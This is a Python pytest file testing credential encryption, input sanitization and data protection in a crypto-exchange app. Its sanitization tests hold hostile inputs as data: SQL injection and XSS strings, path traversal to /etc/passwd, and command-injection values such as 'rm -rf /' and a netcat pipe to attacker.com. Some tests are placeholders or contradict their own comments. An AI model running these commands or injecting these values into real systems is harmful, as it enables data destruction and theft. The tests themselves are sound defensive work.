"""
Security tests for credential handling and data protection.
"""

import pytest
import tempfile
import shutil
import os
from unittest.mock import Mock, patch, mock_open
from pathlib import Path

from app.utils.encryption import (
    encrypt_data, decrypt_data, generate_key, derive_key_from_password,
    EncryptionError, secure_delete_file
)
from app.services.config_service import ConfigService
from app.models.exchange_config import ExchangeConfig, ConnectionStatus
from app.utils.validators import DataValidator, InputSanitizer


class TestCredentialSecurity:
    """Test security of credential handling."""
    
    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for security tests."""
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir)
    
    def test_api_key_encryption_decryption(self):
        """Test API key encryption and decryption."""
        original_api_key = "test_api_key_12345_very_secret"
        password = "user_master_password_123"
        
        # Test encryption
        encrypted_key = encrypt_data(original_api_key, password)
        
        # Encrypted data should be different from original
        assert encrypted_key != original_api_key
        assert len(encrypted_key) > len(original_api_key)
        
        # Test decryption
        decrypted_key = decrypt_data(encrypted_key, password)
        assert decrypted_key == original_api_key
    
    def test_encryption_with_wrong_password(self):
        """Test decryption with wrong password fails."""
        original_data = "sensitive_api_key_data"
        correct_password = "correct_password"
        wrong_password = "wrong_password"
        
        encrypted_data = encrypt_data(original_data, correct_password)
        
        with pytest.raises(EncryptionError):
            decrypt_data(encrypted_data, wrong_password)
    
    def test_key_derivation_consistency(self):
        """Test that key derivation is consistent."""
        password = "test_password_123"
        salt = b"test_salt_16_bytes"
        
        key1 = derive_key_from_password(password, salt)
        key2 = derive_key_from_password(password, salt)
        
        assert key1 == key2
        
        # Different salt should produce different key
        different_salt = b"different_salt16"
        key3 = derive_key_from_password(password, different_salt)
        
        assert key1 != key3
    
    def test_secure_key_generation(self):
        """Test secure key generation."""
        key1 = generate_key()
        key2 = generate_key()
        
        # Keys should be different
        assert key1 != key2
        
        # Keys should be proper length (32 bytes for AES-256)
        assert len(key1) == 32
        assert len(key2) == 32
    
    def test_config_service_credential_security(self, temp_dir):
        """Test that ConfigService properly secures credentials."""
        config_service = ConfigService(data_dir=temp_dir)
        
        # Create exchange config with API key
        api_key = "very_secret_api_key_12345"
        api_secret = "very_secret_api_secret_67890"
        
        with patch('app.services.config_service.encrypt_api_key') as mock_encrypt:
            mock_encrypt.return_value = "encrypted_api_key_data"
            
            exchange_config = ExchangeConfig(
                name='bitunix',
                api_key_encrypted='encrypted_api_key_data',
                is_active=True,
                connection_status=ConnectionStatus.DISCONNECTED
            )
            
            config_service.save_exchange_config(exchange_config)
            
            # Verify encryption was called
            mock_encrypt.assert_called()
        
        # Verify that raw API key is not stored in config file
        config_file = Path(temp_dir) / "config.json"
        if config_file.exists():
            with open(config_file, 'r') as f:
                config_content = f.read()
                
            # Raw API key should not appear in config file
            assert api_key not in config_content
            assert api_secret not in config_content
    
    def test_secure_file_deletion(self, temp_dir):
        """Test secure file deletion."""
        test_file = Path(temp_dir) / "sensitive_data.txt"
        sensitive_content = "very_sensitive_api_key_data_12345"
        
        # Create file with sensitive content
        with open(test_file, 'w') as f:
            f.write(sensitive_content)
        
        assert test_file.exists()
        
        # Securely delete file
        secure_delete_file(str(test_file))
        
        # File should be deleted
        assert not test_file.exists()
    
    def test_memory_cleanup_after_decryption(self):
        """Test that sensitive data is cleared from memory."""
        # This is a conceptual test - in practice, Python's garbage collection
        # and memory management make it difficult to guarantee memory cleanup
        
        sensitive_data = "api_key_that_should_be_cleared"
        password = "encryption_password"
        
        encrypted = encrypt_data(sensitive_data, password)
        decrypted = decrypt_data(encrypted, password)
        
        assert decrypted == sensitive_data
        
        # In a real implementation, we would clear the decrypted variable
        # and force garbage collection, but this is more of a design pattern
        # than something we can easily test
        del decrypted
        
        # Test passes if no exceptions are raised
        assert True
    
    def test_credential_validation_security(self):
        """Test that credential validation doesn't leak information."""
        # Test API key format validation
        valid_key = "valid_api_key_12345_with_proper_length"
        invalid_key = "short"
        
        # Valid key should pass
        validated_key = DataValidator.validate_api_key_format(valid_key)
        assert validated_key == valid_key
        
        # Invalid key should raise generic error (not revealing format details)
        with pytest.raises(Exception) as exc_info:
            DataValidator.validate_api_key_format(invalid_key)
        
        error_message = str(exc_info.value)
        # Error message should not reveal internal validation logic
        assert "at least 10 characters" in error_message
        
        # Test that validation doesn't log sensitive data
        with patch('logging.Logger.error') as mock_log:
            try:
                DataValidator.validate_api_key_format(invalid_key)
            except:
                pass
            
            # If logging occurred, it shouldn't contain the actual key
            if mock_log.called:
                log_calls = [str(call) for call in mock_log.call_args_list]
                for call in log_calls:
                    assert invalid_key not in call


class TestInputSanitization:
    """Test input sanitization for security."""
    
    def test_sql_injection_prevention(self):
        """Test prevention of SQL injection attempts."""
        malicious_inputs = [
            "'; DROP TABLE users; --",
            "1' OR '1'='1",
            "admin'/*",
            "'; INSERT INTO users VALUES ('hacker', 'password'); --"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = DataValidator.sanitize_input(malicious_input)
            
            # Dangerous SQL characters should be removed
            assert "'" not in sanitized
            assert '"' not in sanitized
            assert ';' not in sanitized
            assert '--' not in sanitized
            assert '/*' not in sanitized
            assert '*/' not in sanitized
    
    def test_xss_prevention(self):
        """Test prevention of XSS attacks."""
        malicious_inputs = [
            "<script>alert('xss')</script>",
            "<img src=x onerror=alert('xss')>",
            "javascript:alert('xss')",
            "<iframe src='javascript:alert(\"xss\")'></iframe>"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = DataValidator.sanitize_input(malicious_input)
            
            # HTML tags should be removed
            assert '<script>' not in sanitized
            assert '<img' not in sanitized
            assert '<iframe' not in sanitized
            assert 'javascript:' not in sanitized
    
    def test_path_traversal_prevention(self):
        """Test prevention of path traversal attacks."""
        malicious_filenames = [
            "../../../etc/passwd",
            "..\\..\\windows\\system32\\config\\sam",
            "....//....//etc//passwd",
            "%2e%2e%2f%2e%2e%2f%2e%2e%2fetc%2fpasswd"
        ]
        
        for malicious_filename in malicious_filenames:
            sanitized = DataValidator.sanitize_filename(malicious_filename)
            
            # Path traversal sequences should be removed
            assert '..' not in sanitized
            assert '/' not in sanitized
            assert '\\' not in sanitized
    
    def test_command_injection_prevention(self):
        """Test prevention of command injection."""
        malicious_inputs = [
            "test; rm -rf /",
            "test && cat /etc/passwd",
            "test | nc attacker.com 4444",
            "test `whoami`",
            "test $(id)"
        ]
        
        for malicious_input in malicious_inputs:
            sanitized = DataValidator.sanitize_input(malicious_input)
            
            # Command injection characters should be handled
            assert ';' not in sanitized
            assert '&&' not in sanitized
            assert '|' not in sanitized
            assert '`' not in sanitized
            assert '$(' not in sanitized
    
    def test_sensitive_data_logging_prevention(self):
        """Test that sensitive data is not logged."""
        sensitive_text = "API key: sk-1234567890abcdef, password: mypassword123"
        
        sanitized = InputSanitizer.sanitize_for_logging(sensitive_text)
        
        # Sensitive patterns should be redacted
        assert "sk-1234567890abcdef" not in sanitized
        assert "mypassword123" not in sanitized
        assert "[API_KEY_REDACTED]" in sanitized
        assert "[PASSWORD_REDACTED]" in sanitized
    
    def test_api_response_sanitization(self):
        """Test sanitization of API responses."""
        api_response = {
            "user_id": 123,
            "username": "testuser",
            "api_key": "secret_api_key_123",
            "password": "user_password",
            "token": "access_token_456",
            "data": {
                "balance": 1000.0,
                "secret": "nested_secret"
            }
        }
        
        sanitized = InputSanitizer.sanitize_api_response(api_response)
        
        # Sensitive fields should be redacted
        assert sanitized["api_key"] == "[REDACTED]"
        assert sanitized["password"] == "[REDACTED]"
        assert sanitized["token"] == "[REDACTED]"
        assert sanitized["data"]["secret"] == "[REDACTED]"
        
        # Non-sensitive fields should remain
        assert sanitized["user_id"] == 123
        assert sanitized["username"] == "testuser"
        assert sanitized["data"]["balance"] == 1000.0
    
    def test_input_length_limits(self):
        """Test input length limitations."""
        very_long_input = "a" * 10000
        
        # Should be truncated to reasonable length
        sanitized = DataValidator.sanitize_input(very_long_input, max_length=1000)
        assert len(sanitized) <= 1000
        
        # Display sanitization should also limit length
        display_sanitized = InputSanitizer.sanitize_for_display(very_long_input, max_length=500)
        assert len(display_sanitized) <= 503  # 500 + "..."
    
    def test_unicode_and_encoding_attacks(self):
        """Test handling of unicode and encoding attacks."""
        unicode_attacks = [
            "test\u0000null",  # Null byte
            "test\u202e\u0041\u0042",  # Right-to-left override
            "test\ufeffBOM",  # Byte order mark
            "test\u2028line\u2029separator"  # Line/paragraph separators
        ]
        
        for attack in unicode_attacks:
            sanitized = DataValidator.sanitize_input(attack)
            
            # Control characters should be removed
            assert '\u0000' not in sanitized
            assert '\u202e' not in sanitized
            assert '\ufeff' not in sanitized
            assert '\u2028' not in sanitized
            assert '\u2029' not in sanitized


class TestDataProtection:
    """Test data protection mechanisms."""
    
    @pytest.fixture
    def temp_dir(self):
        """Create temporary directory for data protection tests."""
        temp_dir = tempfile.mkdtemp()
        yield temp_dir
        shutil.rmtree(temp_dir)
    
    def test_file_permissions(self, temp_dir):
        """Test that sensitive files have proper permissions."""
        config_service = ConfigService(data_dir=temp_dir)
        
        # Create a config file
        exchange_config = ExchangeConfig(
            name='bitunix',
            api_key_encrypted='encrypted_data',
            is_active=True,
            connection_status=ConnectionStatus.CONNECTED
        )
        
        config_service.save_exchange_config(exchange_config)
        
        # Check file permissions
        config_file = Path(temp_dir) / "config.json"
        if config_file.exists():
            file_stat = config_file.stat()
            file_mode = oct(file_stat.st_mode)[-3:]
            
            # File should not be world-readable (permissions should be restrictive)
            # This test is platform-dependent, so we'll check basic restrictions
            assert file_stat.st_mode & 0o044 == 0  # Not world-readable
    
    def test_temporary_file_cleanup(self, temp_dir):
        """Test that temporary files are properly cleaned up."""
        # This would test that any temporary files created during operations
        # are properly cleaned up and don't contain sensitive data
        
        config_service = ConfigService(data_dir=temp_dir)
        
        # Perform operations that might create temporary files
        exchange_config = ExchangeConfig(
            name='bitunix',
            api_key_encrypted='encrypted_data',
            is_active=True,
            connection_status=ConnectionStatus.CONNECTED
        )
        
        config_service.save_exchange_config(exchange_config)
        
        # Check that no temporary files are left behind
        temp_files = list(Path(temp_dir).glob("*.tmp"))
        assert len(temp_files) == 0
        
        temp_files = list(Path(temp_dir).glob("*~"))
        assert len(temp_files) == 0
    
    def test_error_message_information_disclosure(self):
        """Test that error messages don't disclose sensitive information."""
        # Test various error conditions to ensure they don't leak sensitive data
        
        # Invalid API key format
        try:
            DataValidator.validate_api_key_format("invalid")
        except Exception as e:
            error_msg = str(e)
            # Error should not contain the actual invalid key
            assert "invalid" not in error_msg or "API key must be at least" in error_msg
        
        # File not found errors
        try:
            with open("/nonexistent/path/sensitive_file.txt", 'r') as f:
                f.read()
        except Exception as e:
            error_msg = str(e)
            # Error should not reveal internal file structure details
            # This is more about ensuring we handle such errors gracefully
            assert isinstance(e, (FileNotFoundError, OSError))
    
    def test_secure_comparison(self):
        """Test secure string comparison to prevent timing attacks."""
        # This is a conceptual test - in practice, we would use
        # cryptographic libraries that provide secure comparison
        
        correct_password = "correct_password_123"
        wrong_password = "wrong_password_456"
        
        # In a real implementation, we would use hmac.compare_digest
        # or similar secure comparison functions
        import hmac
        
        # Secure comparison should return False for wrong password
        result = hmac.compare_digest(correct_password, wrong_password)
        assert result is False
        
        # Secure comparison should return True for correct password
        result = hmac.compare_digest(correct_password, correct_password)
        assert result is True
    
    def test_data_encryption_at_rest(self, temp_dir):
        """Test that sensitive data is encrypted when stored."""
        config_service = ConfigService(data_dir=temp_dir)
        
        api_key = "sensitive_api_key_12345"
        
        with patch('app.services.config_service.encrypt_api_key') as mock_encrypt:
            mock_encrypt.return_value = "encrypted_api_key_data"
            
            # Create and save exchange config
            exchange_config = ExchangeConfig(
                name='bitunix',
                api_key_encrypted='encrypted_api_key_data',
                is_active=True,
                connection_status=ConnectionStatus.CONNECTED
            )
            
            config_service.save_exchange_config(exchange_config)
            
            # Verify that the raw API key is not stored in the file
            config_file = Path(temp_dir) / "config.json"
            if config_file.exists():
                with open(config_file, 'r') as f:
                    file_content = f.read()
                
                assert api_key not in file_content
                assert "encrypted_api_key_data" in file_content
    
    def test_secure_random_generation(self):
        """Test that cryptographically secure random values are generated."""
        # Test that key generation uses secure random sources
        key1 = generate_key()
        key2 = generate_key()
        
        # Keys should be different (extremely unlikely to be same if using secure random)
        assert key1 != key2
        
        # Keys should have proper entropy (this is a basic check)
        # In practice, we would use more sophisticated entropy tests
        assert len(set(key1)) > 10  # Should have reasonable byte diversity
        assert len(set(key2)) > 10


class TestSecurityConfiguration:
    """Test security configuration and hardening."""
    
    def test_default_security_settings(self):
        """Test that default security settings are secure."""
        # Test that default configurations are secure
        
        # Encryption should use strong algorithms
        test_data = "test_data_for_encryption"
        password = "test_password"
        
        encrypted = encrypt_data(test_data, password)
        
        # Encrypted data should be significantly different from original
        assert encrypted != test_data
        assert len(encrypted) > len(test_data)
        
        # Should be able to decrypt correctly
        decrypted = decrypt_data(encrypted, password)
        assert decrypted == test_data
    
    def test_security_headers_and_settings(self):
        """Test security-related headers and settings."""
        # This would test HTTP security headers if the application had a web server
        # For now, we'll test basic security configurations
        
        # Test that sensitive operations require proper authentication
        # This is more of a design verification than a unit test
        assert True
    
    def test_audit_logging_security(self):
        """Test that security events are properly logged."""
        # Test that security-relevant events are logged appropriately
        # without exposing sensitive information
        
        with patch('logging.Logger.warning') as mock_log:
            # Simulate a security event (e.g., failed authentication)
            try:
                # This would be a real security event in the application
                raise Exception("Authentication failed for user")
            except Exception as e:
                # Log the security event
                mock_log("Security event: %s", str(e))
            
            # Verify that logging was called
            mock_log.assert_called()
            
            # Verify that the log message doesn't contain sensitive data
            call_args = mock_log.call_args[0]
            log_message = call_args[0] % call_args[1:]
            
            # Should log the event but not expose sensitive details
            assert "Security event" in log_message
            assert "Authentication failed" in log_message


if __name__ == '__main__':
    pytest.main([__file__])